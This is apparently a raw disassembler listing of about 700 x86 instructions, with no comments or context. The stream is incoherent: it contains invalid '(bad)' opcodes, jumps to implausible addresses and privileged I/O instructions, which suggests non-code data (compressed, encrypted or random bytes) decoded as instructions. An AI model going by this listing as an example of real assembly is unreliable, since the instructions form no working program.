  40fa60:	lods   eax,DWORD PTR ds:[esi]
  40fa62:	xor    eax,0xd1b04a3c
  40fa67:	and    eax,0x7b7d5d18
  40fa6c:	or     al,0x36
  40fa6e:	(bad)  
  40fa6f:	jmp    0x55885cb2
  40fa74:	rcl    DWORD PTR [edi+0x6de6ea2e],cl
  40fa7a:	inc    ebx
  40fa7b:	mov    dl,0xa6
  40fa7d:	jns    0x40fa55
  40fa7f:	inc    edi
  40fa80:	push   ds
  40fa81:	dec    eax
  40fa82:	cmp    bh,BYTE PTR [ebx+0x1f]
  40fa85:	pop    ebx
  40fa86:	call   0xccde604b
  40fa8b:	jl     0x40faf8
  40fa8d:	or     al,ch
  40fa8f:	xchg   ebp,eax
  40fa90:	or     eax,DWORD PTR [ebx]
  40fa92:	inc    ebx
  40fa93:	out    0x4b,eax
  40fa95:	add    al,0x8d
  40fa97:	stos   DWORD PTR es:[edi],eax
  40fa98:	stos   DWORD PTR es:[edi],eax
  40fa99:	hlt    
  40fa9a:	popf   
  40fa9b:	sbb    DWORD PTR [ecx],esi
  40fa9d:	test   BYTE PTR [ecx+0x2ae29f68],ah
  40faa3:	mov    al,ds:0x3ea2637b
  40faa8:	and    eax,0x792df3c9
  40faad:	push   cs
  40faae:	inc    edi
  40faaf:	add    ecx,DWORD PTR [eax+eiz*2]
  40fab2:	jb     0x40fafd
  40fab4:	adc    al,0x40
  40fab6:	test   BYTE PTR [edx+0x5ba74083],0x3b
  40fabd:	mov    al,ds:0x363c95fa
  40fac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac3:	sahf   
  40fac4:	mov    bl,0x9b
  40fac6:	add    al,0xf7
  40fac8:	adc    edx,DWORD PTR [edx+0x27]
  40facb:	push   cs
  40facc:	test   al,0x5b
  40face:	sar    bh,cl
  40fad0:	add    BYTE PTR [ecx+0x6f],al
  40fad3:	and    eax,0x91c3ba3
  40fad8:	fsubr  st(0),st
  40fada:	and    ah,BYTE PTR [edx+0x79]
  40fadd:	mov    bh,0xce
  40fadf:	sbb    esi,DWORD PTR [edi]
  40fae1:	or     ecx,edi
  40fae3:	loop   0x40fad1
  40fae5:	out    0x12,al
  40fae7:	xor    cl,BYTE PTR [ecx-0x56]
  40faea:	sbb    BYTE PTR [eax],0x29
  40faed:	adc    BYTE PTR [eax+0x2a],bh
  40faf0:	mov    dl,0x87
  40faf2:	jp     0x40fae9
  40faf4:	cmp    esp,DWORD PTR [ebx]
  40faf6:	dec    esp
  40faf7:	in     al,dx
  40faf8:	jmp    0x991b:0x31947994
  40faff:	scas   eax,DWORD PTR es:[edi]
  40fb00:	sub    DWORD PTR [ecx+0x29e07218],eax
  40fb06:	xor    ebp,esi
  40fb08:	fild   DWORD PTR [ecx+eax*1]
  40fb0b:	pop    ss
  40fb0c:	stos   BYTE PTR es:[edi],al
  40fb0d:	inc    edx
  40fb0e:	fdivr  st,st(2)
  40fb10:	and    al,0x5e
  40fb12:	test   eax,0x2864dee5
  40fb17:	push   esp
  40fb18:	pop    ds
  40fb19:	or     al,0x74
  40fb1b:	in     eax,0x31
  40fb1d:	ins    DWORD PTR es:[edi],dx
  40fb1e:	rcl    BYTE PTR [eax-0xd],cl
  40fb21:	(bad)  [ecx]
  40fb23:	fmul   st,st(3)
  40fb25:	call   0x6b3c6599
  40fb2a:	das    
  40fb2b:	mov    al,ds:0x348ee897
  40fb30:	or     cl,bh
  40fb32:	xor    al,0x5b
  40fb34:	add    DWORD PTR [ebx-0x420f5732],ebx
  40fb3a:	imul   esp,DWORD PTR ds:0xd0f66eff,0xffffffd0
  40fb41:	out    dx,eax
  40fb42:	jl     0x40faf6
  40fb44:	adc    dh,BYTE PTR [ebp-0x49]
  40fb47:	mov    al,0xd9
  40fb49:	ins    DWORD PTR es:[edi],dx
  40fb4a:	mov    bh,0xfd
  40fb4c:	adc    dl,bl
  40fb4e:	push   ss
  40fb4f:	test   DWORD PTR [ecx],edi
  40fb51:	and    BYTE PTR gs:[esi],ch
  40fb54:	jns    0x40fb96
  40fb56:	xchg   eax,esi
  40fb58:	out    dx,eax
  40fb59:	xor    eax,0x80ae3473
  40fb5e:	cmp    DWORD PTR [eax+0x18b0a2fe],ebx
  40fb64:	stos   BYTE PTR es:[edi],al
  40fb65:	cli    
  40fb66:	fs sbb al,0x42
  40fb69:	fbstp  TBYTE PTR [ebx+0x165f6469]
  40fb6f:	adc    eax,0xc252240e
  40fb74:	push   edi
  40fb75:	or     ebp,ecx
  40fb77:	push   0xe1d81de
  40fb7c:	jno    0x40fbd3
  40fb7e:	jle    0x40fb05
  40fb80:	stc    
  40fb81:	cld    
  40fb82:	pop    esp
  40fb83:	std    
  40fb84:	add    bh,bl
  40fb86:	dec    edi
  40fb87:	ds mov bh,0xa2
  40fb8a:	push   edi
  40fb8b:	das    
  40fb8c:	cmc    
  40fb8d:	xchg   ecx,eax
  40fb8e:	int    0x26
  40fb90:	mov    ch,0x87
  40fb92:	data16 mov bl,0x6
  40fb95:	adc    edx,DWORD PTR [edx]
  40fb97:	push   eax
  40fb98:	xor    eax,DWORD PTR ds:0xfc2084c2
  40fb9e:	mov    ebx,DWORD PTR [esi]
  40fba0:	inc    esi
  40fba1:	mov    bh,0xb1
  40fba3:	test   BYTE PTR [ecx],ch
  40fba5:	sbb    DWORD PTR [eax-0x66],0xb92d6ed9
  40fbac:	add    al,0xc5
  40fbae:	out    0xef,al
  40fbb0:	ret    
  40fbb1:	cmp    eax,0xfeb7c4eb
  40fbb6:	jmp    ecx
  40fbb8:	mov    ss,WORD PTR [esi-0x65b82635]
  40fbbe:	mov    edx,0x31d5d45f
  40fbc3:	mov    ebp,0x880aed1d
  40fbc8:	out    dx,eax
  40fbc9:	shr    DWORD PTR ss:0x31623b6b,0x2c
  40fbd1:	(bad)  
  40fbd2:	mov    ebp,DWORD PTR [edi+0x6e]
  40fbd5:	push   eax
  40fbd6:	dec    edx
  40fbd7:	push   ds
  40fbd8:	pop    edi
  40fbd9:	les    eax,FWORD PTR [ecx]
  40fbdb:	sub    cl,BYTE PTR [edi+0x4b]
  40fbde:	test   al,0x40
  40fbe0:	loopne 0x40fbaa
  40fbe2:	sti    
  40fbe3:	mov    ch,0x19
  40fbe5:	ficomp DWORD PTR ds:0xe987395d
  40fbeb:	jl     0x40fb9e
  40fbed:	ret    0x8115
  40fbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf1:	scas   eax,DWORD PTR es:[edi]
  40fbf2:	cmp    edi,eax
  40fbf4:	mov    bl,0xf3
  40fbf6:	loopne 0x40fbaa
  40fbf8:	dec    esp
  40fbf9:	outs   dx,BYTE PTR ds:[esi]
  40fbfa:	add    BYTE PTR ds:0x329ec50c,bl
  40fc00:	dec    esi
  40fc01:	and    al,0xa5
  40fc03:	jle    0x40fc36
  40fc05:	out    dx,eax
  40fc06:	xchg   DWORD PTR [ebx],ebx
  40fc08:	clc    
  40fc09:	cmp    BYTE PTR [edx+0x77852b5a],cl
  40fc0f:	cmp    ah,BYTE PTR [edx]
  40fc11:	enter  0xe720,0xab
  40fc15:	dec    esi
  40fc16:	cmp    DWORD PTR ds:0xc0404ff2,edx
  40fc1c:	pop    ds
  40fc1d:	repz sub eax,ebx
  40fc20:	fisttp QWORD PTR [bp+di+0x3c]
  40fc24:	fadd   DWORD PTR [eax]
  40fc26:	xchg   BYTE PTR [esi],ch
  40fc28:	(bad)  
  40fc29:	addr16 sbb ah,dh
  40fc2c:	xchg   BYTE PTR [ebx],dh
  40fc2e:	repz cmp ecx,edi
  40fc31:	push   esp
  40fc32:	jo     0x40fc0d
  40fc34:	(bad)  
  40fc35:	sbb    ebp,DWORD PTR [edx-0x3e]
  40fc38:	push   ds
  40fc39:	(bad)  
  40fc3a:	dec    ebx
  40fc3b:	js     0x40fc51
  40fc3d:	dec    edx
  40fc3e:	(bad)  
  40fc3f:	repnz inc ebx
  40fc41:	fld    st(1)
  40fc43:	(bad)  
  40fc44:	fnstcw WORD PTR [ebx+0x51189f34]
  40fc4a:	mov    al,ds:0x71d5fd54
  40fc4f:	sbb    al,0x67
  40fc51:	fbstp  TBYTE PTR [eax-0x30]
  40fc54:	add    eax,0x19213514
  40fc59:	jge    0x40fbfb
  40fc5b:	sahf   
  40fc5c:	and    bl,BYTE PTR [edx+0x387ef48c]
  40fc62:	addr16 and al,0xb
  40fc65:	out    dx,eax
  40fc66:	push   0xcea709c9
  40fc6b:	fild   DWORD PTR [edx]
  40fc6d:	fwait
  40fc6e:	push   0xffffffb2
  40fc70:	add    eax,0xb06178f1
  40fc75:	xchg   ecx,eax
  40fc76:	outs   dx,DWORD PTR ds:[esi]
  40fc77:	out    dx,eax
  40fc78:	out    0x66,eax
  40fc7a:	pop    eax
  40fc7b:	cli    
  40fc7c:	sbb    dl,BYTE PTR [ecx]
  40fc7e:	or     ebx,eax
  40fc80:	or     al,ah
  40fc82:	arpl   WORD PTR [esi],si
  40fc84:	aad    0x19
  40fc86:	cmc    
  40fc87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc88:	fbld   TBYTE PTR [ecx]
  40fc8a:	jle    0x40fc80
  40fc8c:	fs mov edx,0x63a090db
  40fc92:	mov    WORD PTR [edi+eax*2-0x6c],?
  40fc96:	mov    esp,edi
  40fc98:	mov    ds:0x72856179,al
  40fc9d:	mov    gs,WORD PTR [ebx-0x7c41ee6c]
  40fca3:	rol    bh,1
  40fca5:	add    DWORD PTR [edx],ebp
  40fca7:	cwde   
  40fca8:	pop    esp
  40fca9:	(bad)  
  40fcab:	mov    bl,0xfc
  40fcad:	adc    al,bh
  40fcaf:	inc    ebp
  40fcb0:	int3   
  40fcb1:	ror    ebx,cl
  40fcb3:	mov    al,ds:0x6854ab82
  40fcb8:	mov    ebp,DWORD PTR [eax]
  40fcba:	mov    al,ds:0x61ba4f0c
  40fcbf:	cwde   
  40fcc0:	bswap  ebp
  40fcc2:	mov    edi,esp
  40fcc4:	fwait
  40fcc5:	sti    
  40fcc6:	in     eax,0x29
  40fcc8:	push   eax
  40fcc9:	aam    0x17
  40fccb:	jns    0x40fd32
  40fccd:	jno    0x40fc7a
  40fccf:	fnstcw WORD PTR [ebx+0x208b9ef9]
  40fcd5:	pop    edi
  40fcd6:	inc    edx
  40fcd7:	ror    DWORD PTR ds:0x909cc503,cl
  40fcdd:	push   es
  40fcde:	pop    ecx
  40fcdf:	adc    ah,bh
  40fce1:	cmp    DWORD PTR [ecx+0x21],ecx
  40fce4:	jae    0x40fd18
  40fce6:	dec    eax
  40fce7:	sti    
  40fce8:	and    BYTE PTR [ecx-0x1545e7cf],0x7d
  40fcef:	bound  ebx,QWORD PTR [ecx-0x5b]
  40fcf2:	xchg   edi,eax
  40fcf3:	pop    ss
  40fcf4:	test   al,0x67
  40fcf6:	stc    
  40fcf7:	jmp    0x40fd11
  40fcf9:	mov    ecx,0xcc12150e
  40fcfe:	shl    BYTE PTR [esi-0x34dff0b],cl
  40fd04:	xor    eax,0x2636fdf8
  40fd09:	push   0xffffffb1
  40fd0b:	adc    BYTE PTR [ebp+0x6eabe77b],bl
  40fd11:	arpl   cx,bx
  40fd13:	jb     0x40fd11
  40fd15:	jbe    0x40fd25
  40fd17:	daa    
  40fd18:	xchg   DWORD PTR [ebx],edx
  40fd1a:	add    eax,DWORD PTR [edi]
  40fd1c:	stos   DWORD PTR es:[edi],eax
  40fd1d:	dec    esp
  40fd1e:	aaa    
  40fd1f:	push   ds
  40fd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd21:	cmp    ah,al
  40fd23:	pushf  
  40fd24:	push   esp
  40fd25:	cwde   
  40fd26:	stos   DWORD PTR es:[edi],eax
  40fd27:	push   0xc45307f4
  40fd2c:	xchg   dl,al
  40fd2e:	test   esi,edx
  40fd30:	ret    0xbc84
  40fd33:	or     bl,BYTE PTR [edx-0x4fb93658]
  40fd39:	sub    DWORD PTR [esi+esi*4-0x57],esp
  40fd3d:	in     al,dx
  40fd3e:	xchg   ebp,eax
  40fd3f:	sub    eax,0xb8a8d8b3
  40fd44:	or     dl,BYTE PTR [edi]
  40fd46:	sbb    ah,BYTE PTR [ebp-0x1f780523]
  40fd4c:	ds push ds
  40fd4e:	cld    
  40fd4f:	mov    al,0x69
  40fd51:	daa    
  40fd52:	pushf  
  40fd53:	rcr    BYTE PTR [esi+0x67],1
  40fd56:	xlat   BYTE PTR ds:[ebx]
  40fd57:	stc    
  40fd58:	xchg   ebx,eax
  40fd59:	out    dx,eax
  40fd5a:	mov    edx,0x250b7cb0
  40fd5f:	loopne 0x40fd72
  40fd61:	sub    eax,0x40b48415
  40fd66:	into   
  40fd67:	dec    ebp
  40fd68:	jnp    0x40fdd1
  40fd6a:	push   ebx
  40fd6b:	in     al,dx
  40fd6c:	fptan  
  40fd6e:	cmp    DWORD PTR [eax-0x461576a8],eax
  40fd74:	add    ch,BYTE PTR [ecx]
  40fd76:	cwde   
  40fd77:	xchg   ebx,eax
  40fd78:	add    al,0xb8
  40fd7a:	addr16 jmp 0x40fd21
  40fd7d:	xchg   edi,eax
  40fd7e:	iret   
  40fd7f:	ins    BYTE PTR es:[edi],dx
  40fd80:	ins    BYTE PTR es:[edi],dx
  40fd81:	xchg   ebx,eax
  40fd82:	outs   dx,BYTE PTR ds:[esi]
  40fd83:	mov    dl,0x31
  40fd85:	add    DWORD PTR [esi-0x54324ac3],esi
  40fd8b:	hlt    
  40fd8c:	push   ss
  40fd8d:	fild   QWORD PTR [edx-0x41]
  40fd90:	cmp    DWORD PTR [ebx-0x61128f9b],ecx
  40fd96:	and    dl,al
  40fd98:	jmp    0x9fc7c7f0
  40fd9d:	clc    
  40fd9e:	dec    ebx
  40fd9f:	pop    esi
  40fda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda1:	test   DWORD PTR [edi-0x395c28c],esi
  40fda7:	daa    
  40fda8:	xchg   DWORD PTR [edx+0xb],ecx
  40fdab:	and    DWORD PTR ds:0xb345999b,0x2684d0b6
  40fdb5:	sbb    al,BYTE PTR [ecx-0x30]
  40fdb8:	inc    BYTE PTR [edi+0x65a4f5dc]
  40fdbe:	ficom  WORD PTR [esi+0x72]
  40fdc1:	mov    edx,0xb6314dd0
  40fdc6:	test   dh,dl
  40fdc8:	popf   
  40fdc9:	xor    DWORD PTR [edi-0x6b],edi
  40fdcc:	(bad)  
  40fdcd:	rcl    BYTE PTR [ebp-0x1514658a],cl
  40fdd3:	fiadd  WORD PTR [ebp-0x56]
  40fdd6:	mov    al,ds:0x6a428eec
  40fddb:	pop    ebp
  40fddc:	jns    0x40fe08
  40fdde:	inc    DWORD PTR cs:[eax-0x41]
  40fde2:	jno    0x40fdc6
  40fde4:	xor    ch,BYTE PTR [edi-0x34d566b0]
  40fdea:	out    0x90,al
  40fdec:	fdiv   DWORD PTR [ebp+0xf]
  40fdef:	mov    ah,0x6c
  40fdf1:	je     0x40fe25
  40fdf3:	adc    eax,0xdf8cb91b
  40fdf8:	adc    dh,bl
  40fdfa:	retf   0xe1b8
  40fdfd:	imul   esp,esi,0xffffffac
  40fe00:	(bad)  
  40fe01:	push   ebp
  40fe02:	retf   
  40fe03:	aam    0x85
  40fe05:	jg     0x40fe1e
  40fe07:	dec    ecx
  40fe08:	jmp    0x40fdfb
  40fe0a:	rol    BYTE PTR [ebp-0xb6686bf],0xa
  40fe11:	rol    BYTE PTR [ebx],cl
  40fe13:	or     dl,BYTE PTR [ecx]
  40fe15:	sbb    DWORD PTR [ebp-0x38],0x2a
  40fe19:	inc    ecx
  40fe1a:	shl    ebp,cl
  40fe1c:	btc    ebp,esp
  40fe1f:	aaa    
  40fe20:	test   al,0x59
  40fe22:	pop    esi
  40fe23:	adc    DWORD PTR [esi+0x5c],ebx
  40fe26:	pop    ebx
  40fe27:	cmp    DWORD PTR [edx+0x6e],edx
  40fe2a:	mov    DWORD PTR [edi+0x7],esi
  40fe2d:	inc    ecx
  40fe2e:	outs   dx,BYTE PTR ds:[esi]
  40fe2f:	stc    
  40fe30:	sbb    edx,DWORD PTR [esi+0x24]
  40fe33:	aad    0xd5
  40fe35:	(bad)  
  40fe36:	jmp    0xb5f8227a
  40fe3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe3c:	and    esi,eax
  40fe3e:	aas    
  40fe3f:	mov    edx,0x54c78db4
  40fe44:	dec    esp
  40fe45:	dec    ebx
  40fe46:	shl    DWORD PTR fs:[esp+ecx*4],cl
  40fe4a:	sub    eax,0xaecb9a59
  40fe4f:	mov    dl,0xfe
  40fe51:	add    DWORD PTR [esi-0x20486b6c],edi
  40fe57:	cmp    ebx,DWORD PTR [edi]
  40fe59:	cmp    BYTE PTR [eax+esi*8+0x5f],ch
  40fe5d:	hlt    
  40fe5e:	dec    edi
  40fe5f:	shr    DWORD PTR [edx],cl
  40fe61:	pop    es
  40fe62:	xor    DWORD PTR ds:0xc0615bcb,esp
  40fe68:	adc    al,0x4d
  40fe6a:	dec    ebx
  40fe6b:	leave  
  40fe6c:	xchg   edx,eax
  40fe6e:	ror    ebx,cl
  40fe70:	mov    eax,0xde9ea734
  40fe75:	retf   0x8a29
  40fe78:	adc    cl,BYTE PTR [eax-0x69d3a899]
  40fe7e:	fdivr  st(5),st
  40fe80:	adc    ah,bl
  40fe82:	xor    DWORD PTR [ecx],ebx
  40fe84:	mov    ebp,0x63d26eb4
  40fe89:	sar    DWORD PTR [edi-0x49feec2d],0x38
  40fe90:	sbb    BYTE PTR [ebx+0x6547296a],dh
  40fe96:	idiv   ah
  40fe98:	retf   
  40fe99:	push   ebx
  40fe9a:	enter  0xc75,0xae
  40fe9e:	jae    0x40ff18
  40fea0:	push   ebp
  40fea1:	xchg   ebx,eax
  40fea2:	sbb    al,0xe2
  40fea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea5:	jmp    0x40fee3
  40fea7:	jp     0x40fecf
  40fea9:	push   cs
  40feaa:	in     eax,dx
  40feab:	cmc    
  40feac:	dec    eax
  40fead:	mov    cl,0x4e
  40feaf:	jb     0x40fe95
  40feb1:	sbb    al,BYTE PTR [esi-0x5be9d9e4]
  40feb7:	or     DWORD PTR [esi],0x57
  40feba:	sar    ah,cl
  40febc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40febd:	sbb    al,0xc6
  40febf:	(bad)  
  40fec0:	lahf   
  40fec1:	js     0x40fee9
  40fec3:	sbb    eax,0x63fa2623
  40fec8:	or     ecx,DWORD PTR [ebp+ecx*2+0x558f1d43]
  40fecf:	xchg   BYTE PTR [ecx+0x6b],ch
  40fed2:	jmp    0xe37d15e6
  40fed7:	les    edx,FWORD PTR [eax+eax*1]
  40feda:	pop    ecx
  40fedb:	out    0xbc,al
  40fedd:	mov    DWORD PTR [eax-0x31],edi
  40fee0:	mov    BYTE PTR es:[ecx-0x5],ah
  40fee4:	fild   DWORD PTR [esi+0x4]
  40fee7:	mov    WORD PTR [ebx-0x5a093df5],es
  40feed:	in     eax,0xd2
  40feef:	in     al,dx
  40fef0:	jns    0x40fe76
  40fef2:	fmul   QWORD PTR [edi-0x6affefa4]
  40fef8:	xor    dh,bl
  40fefa:	pop    edx
  40fefb:	fsub   QWORD PTR [ebx-0x1dc749d5]
  40ff01:	int    0x37
  40ff03:	xchg   ch,dl
  40ff05:	fcomp  st(7)
  40ff07:	(bad)
  40ff0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0b:	loop   0x40ff15
  40ff0d:	rol    DWORD PTR [edx-0x6ba248dd],cl
  40ff13:	jg     0x40ff1d
  40ff15:	sbb    bl,0xfb
  40ff18:	es and ebx,eax
  40ff1b:	retf   0x8c75
  40ff1e:	xchg   DWORD PTR [ebx+0x2],eax
  40ff21:	jmp    0x40ff33
  40ff23:	push   edx
  40ff24:	gs xor al,0x62
  40ff27:	pop    esi
  40ff28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff29:	lds    esi,FWORD PTR [edi]
  40ff2b:	sub    DWORD PTR [esi-0x2b5303f8],ebx
  40ff31:	xchg   edi,eax
  40ff32:	std    
  40ff33:	int    0x7d
  40ff35:	mov    ch,0x33
  40ff37:	sahf   
  40ff38:	xlat   BYTE PTR ds:[ebx]
  40ff39:	mov    bh,0x2b
  40ff3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff3c:	jae    0x40fef0
  40ff3e:	imul   edi,DWORD PTR [ecx],0xc29ba65a
  40ff44:	and    al,0xec
  40ff46:	jo     0x40feec
  40ff48:	inc    ecx
  40ff49:	mov    esi,0x17e54c2c
  40ff4e:	cld    
  40ff4f:	les    edi,FWORD PTR [ebp+0x377cac00]
  40ff55:	add    BYTE PTR [esi-0x36188195],al
  40ff5b:	imul   ebx,ebp,0x48
  40ff5e:	pop    edx
  40ff5f:	push   ds
  40ff60:	fimul  DWORD PTR [ebp-0x3e]
  40ff63:	adc    DWORD PTR [esi+ebx*2-0x1e5d7b37],esi
  40ff6a:	cmc    
  40ff6b:	push   ds
  40ff6c:	dec    esp
  40ff6d:	xor    DWORD PTR [edx+eax*2-0x28],edi
  40ff71:	push   es
  40ff72:	jmp    0x22454f1e
  40ff77:	(bad)  
  40ff78:	sbb    al,0x8
  40ff7a:	sub    DWORD PTR ds:0x34667cb,ecx
  40ff80:	cwde   
  40ff81:	fwait
  40ff82:	xor    eax,0xe12c60c4
  40ff87:	lea    edx,[edx]
  40ff89:	mov    bh,0x68
  40ff8b:	aad    0x4
  40ff8d:	adc    BYTE PTR [edi+0x15bdc446],al
  40ff93:	aad    0xbc
  40ff95:	dec    edx
  40ff96:	adc    DWORD PTR [eax-0x2d017ea],0xbec0fba2
  40ffa0:	div    BYTE PTR [ebp-0x74ce5015]
  40ffa6:	jecxz  0x40ff39
  40ffa8:	jo     0x40ff2a
  40ffaa:	cmc    
  40ffab:	cli    
  40ffac:	inc    ecx
  40ffad:	(bad)  
  40ffae:	aam    0xa
  40ffb0:	and    al,BYTE PTR [eax-0x9daf6c6]
  40ffb6:	cmp    eax,0xe971f3ed
  40ffbb:	idiv   BYTE PTR [ebp+esi*8-0x4c]
  40ffbf:	xor    ebp,DWORD PTR [ebx]
  40ffc1:	sub    DWORD PTR [ebp-0x1f],esp
  40ffc4:	xchg   esp,esi
  40ffc6:	jecxz  0x40ffb3
  40ffc8:	xchg   eax,esi
  40ffca:	jns    0x410005
  40ffcc:	mov    edx,0x7a854805
  40ffd1:	pop    esp
  40ffd2:	sub    esp,ebx
  40ffd4:	or     al,BYTE PTR [ebx]
  40ffd6:	mov    dl,0x5c
  40ffd8:	mov    al,0xb5
  40ffda:	ficomp DWORD PTR [esi]
  40ffdc:	sub    ebx,edi
  40ffde:	cwde   
  40ffdf:	js     0x40ffe3
  40ffe1:	adc    ebx,DWORD PTR [esi+0x0]
  40ffe4:	repz (bad) 
  40ffe6:	or     eax,0xdd71cc8e
  40ffeb:	dec    eax
  40ffec:	data16 jg 0x410060
  40ffef:	pop    edx
  40fff0:	cmp    eax,0xd12f98f9
  40fff5:	ja     0x41002a
  40fff7:	cmp    ebx,esi
  40fff9:	xlat   BYTE PTR ds:[ebx]
  40fffa:	mov    ah,0xe1
  40fffc:	fbld   TBYTE PTR [eax-0x78]
  40ffff:	adc    DWORD PTR [eax+0x4b86cb1d],edi
  410005:	int3   
  410006:	fsubr  st,st(3)
  410008:	sub    al,0x17
  41000a:	popa   
  41000b:	cmp    BYTE PTR [edi-0x31],cl
  41000e:	sub    DWORD PTR [ebx+0x27],0x68
  410012:	dec    esp
  410013:	leave  
  410014:	mov    al,BYTE PTR [edx-0x5a]
  410017:	out    dx,eax
  410018:	stos   BYTE PTR es:[edi],al
  410019:	fstp   DWORD PTR [ebx]
  41001b:	dec    edx
  41001c:	sbb    dh,BYTE PTR [ecx+ebx*2-0x36]
  410020:	push   edx
  410021:	xor    esi,DWORD PTR [ebx]
  410023:	imul   edx,DWORD PTR [esi+0x1ed105a1],0x2
  41002a:	xlat   BYTE PTR ds:[ebx]
  41002b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002c:	and    eax,0xec463d24
  410031:	in     al,0x16
  410033:	jae    0x40ffe1
  410035:	sbb    BYTE PTR [edi+edi*2+0x74],bl
  410039:	test   eax,0x2067b3d6
  41003e:	pusha  
  41003f:	and    ebx,DWORD PTR ds:0x64e17651
  410045:	clc    
  410046:	mov    al,ds:0x44d7105a
  41004b:	stos   DWORD PTR es:[edi],eax
  41004c:	(bad)  
  41004e:	adc    al,0xa7
  410050:	mov    ecx,0xaa5adf87
  410055:	jle    0x40fff5
  410057:	clc    
  410058:	stos   BYTE PTR es:[edi],al
  410059:	inc    edi
  41005a:	mov    gs:0x58959c85,al
  410060:	cmp    BYTE PTR [esi+ebp*4-0x27aee70b],ah
  410067:	mov    esp,DWORD PTR [ebx+0xcbb8f89]
  41006d:	add    BYTE PTR [edx],bh
  41006f:	aad    0xac
  410071:	shl    BYTE PTR [ebx-0x6],cl
  410074:	retf   
  410075:	mov    WORD PTR [eax],ss
  410077:	test   esp,esi
  410079:	inc    edi
  41007a:	ds out 0x30,eax
  41007d:	jl     0x4100ca
  41007f:	adc    esp,DWORD PTR [ecx]
  410081:	cmp    ch,al
  410083:	mov    al,ds:0x95d26a6b
  410088:	mov    cl,0xdf
  41008a:	fisttp WORD PTR [edx-0x7a]
  41008d:	jmp    0x410013
  41008f:	dec    ecx
  410090:	push   eax
  410091:	adc    al,BYTE PTR [edi-0x5a]
  410094:	test   al,0x3a
  410096:	cwde   
  410097:	inc    edx
  410098:	(bad)  
  410099:	ror    BYTE PTR [ecx],1
  41009b:	shl    DWORD PTR [edx],0x8
  41009e:	bound  esi,QWORD PTR [eax]
  4100a0:	aad    0x50
  4100a2:	xchg   esi,eax
  4100a3:	pusha  
  4100a4:	fld    QWORD PTR [ebx]
  4100a6:	lods   eax,DWORD PTR ds:[esi]
  4100a7:	mov    WORD PTR [edi-0x6f],fs
  4100aa:	jg     0x410062
  4100ac:	add    al,0xa
  4100ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100af:	sub    edx,esi
  4100b1:	inc    esp
  4100b2:	fnstsw WORD PTR ds:0x962a4878
  4100b8:	dec    ebp
  4100b9:	rcl    BYTE PTR [ebp+0x1],1
  4100bc:	xor    BYTE PTR [edx+ecx*4],0xc9
  4100c0:	mov    cl,0x55
  4100c2:	in     eax,0xd6
  4100c4:	jo     0x410093
  4100c6:	adc    BYTE PTR [ecx+0x5c0a28d6],0xe6
  4100cd:	mov    esp,0xd851bc55
  4100d2:	lock out 0xf5,al
  4100d5:	sbb    ecx,esp
  4100d7:	into   
  4100d8:	in     al,dx
  4100d9:	or     BYTE PTR ds:0x8981c1af,dh
  4100df:	adc    edi,edi
  4100e1:	outs   dx,BYTE PTR ds:[esi]
  4100e2:	pop    ebx
  4100e3:	call   0x1783:0x11491d8e
  4100ea:	scas   al,BYTE PTR es:[edi]
  4100eb:	aam    0x18
  4100ed:	mov    dl,0xac
  4100ef:	hlt    
  4100f0:	outs   dx,BYTE PTR ds:[esi]
  4100f1:	mov    al,BYTE PTR [ecx]
  4100f3:	push   0x101e4565
  4100f8:	pop    ebx
  4100f9:	push   esp
  4100fa:	inc    ecx
  4100fb:	dec    ecx
  4100fc:	lock int 0x5b
  4100ff:	lds    esp,FWORD PTR [ebx+0x788d2aab]
  410105:	outs   dx,BYTE PTR ds:[esi]
  410106:	add    al,0x67
  410108:	xor    esi,0xffffffa1
  41010b:	es inc esi
  41010d:	push   esi
  41010e:	popa   
  41010f:	jne    0x4100f7
  410111:	aam    0x48
  410113:	and    eax,0x3c104e66
  410118:	test   bl,0xdd
  41011b:	fnstsw WORD PTR [edi-0x39]
  41011e:	push   esi
  41011f:	addr16 clc 
  410121:	fsubr  st(3),st
  410123:	fwait
  410124:	cmp    bh,BYTE PTR [eax]
  410126:	cmp    ebx,DWORD PTR [ecx+0x5d]
  410129:	mov    ebp,0xb3182f5
  41012e:	out    0x5a,al
  410130:	cmp    eax,0x9b0df67a
  410135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410136:	and    DWORD PTR [ebp+0x4e],esi
  410139:	hlt    
  41013a:	(bad)  
  41013b:	sbb    bl,BYTE PTR [ecx]
  41013d:	cmc    
  41013e:	pop    esi
  41013f:	mov    esp,0xb21adef2
  410144:	pop    ebp
  410145:	iret   
  410146:	mov    cl,0xaf
  410148:	je     0x4101c9
  41014a:	gs aam 0x7b
  41014d:	inc    esp
  41014e:	mov    bh,0x37
  410150:	push   ecx
  410151:	adc    esi,DWORD PTR [esi]
  410153:	dec    ecx
  410154:	push   0x22c5e5db
  410159:	ret    0x1277
  41015c:	cwde   
  41015d:	nop
  41015e:	cmc    
  41015f:	enter  0x8cae,0xda
  410163:	add    BYTE PTR ds:0x160a0604,dl
  410169:	fsub   DWORD PTR [esi-0xe]
  41016c:	add    dh,BYTE PTR [esi]
  41016e:	mov    ds:0xfb65c16d,eax
  410173:	mov    al,ds:0xfe220af4
  410178:	test   dh,cl
  41017a:	adc    esi,DWORD PTR [edx]
  41017c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41017d:	out    0x66,eax
  41017f:	cld    
  410180:	ds (bad) 
  410182:	popf   
  410183:	jae    0x410105
  410185:	repz (bad) 
  410187:	out    dx,al
  410188:	push   esp
  410189:	inc    esp
  41018a:	adc    dl,dh
  41018c:	in     al,0x72
  41018e:	loopne 0x410113
  410190:	mov    cl,0xe7
  410192:	xor    eax,0xed9121b6
  410197:	sub    al,0xd8
  410199:	test   eax,0x1730be39
